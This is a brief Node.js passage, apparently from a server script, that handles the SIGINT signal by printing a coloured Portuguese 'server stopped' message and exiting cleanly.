process.on('SIGINT', () => {
  console.log(`\n${C.yellow}⚡ Servidor parado.${C.reset}\n`);
  process.exit(0);
});
